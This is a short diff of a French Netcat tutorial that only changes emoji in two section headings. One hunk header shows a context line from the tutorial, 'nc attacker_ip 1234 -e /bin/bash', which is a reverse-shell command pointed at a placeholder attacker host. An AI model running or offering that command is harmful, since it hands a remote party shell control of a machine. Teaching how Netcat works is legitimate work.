@@ -76,7 +76,7 @@ Netcat est souvent surnommé le "couteau suisse des réseaux" grâce à sa simpl
 
 ***
 
-### 🚀 Étape 2 : Utilisations de Base
+### 🛠️ Étape 2 : Utilisations de Base
 
 ***
 
@@ -184,7 +184,7 @@ nc attacker_ip 1234 -e /bin/bash
 
 ***
 
-### 🚀 Étape 3 : Options Avancées
+### 🔍 Étape 3 : Options Avancées
 
 ***
 
